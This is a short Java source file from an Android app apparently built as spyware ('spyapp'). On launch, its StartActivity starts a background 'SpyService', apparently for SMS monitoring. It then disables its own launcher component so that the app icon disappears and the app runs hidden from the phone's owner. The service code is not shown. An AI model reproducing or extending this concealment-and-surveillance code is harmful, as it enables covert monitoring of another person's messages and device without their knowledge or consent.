package com.spyapp.android.activity;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

import com.spyapp.android.service.SpyService;

public class StartActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        startSmsService();
        removeApplicationIcon();
        finish();
    }

    private void startSmsService() {
        Intent serviceIntent = new Intent(getBaseContext(), SpyService.class);
        startService(serviceIntent);
    }

    private void removeApplicationIcon() {
        getPackageManager().setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

}
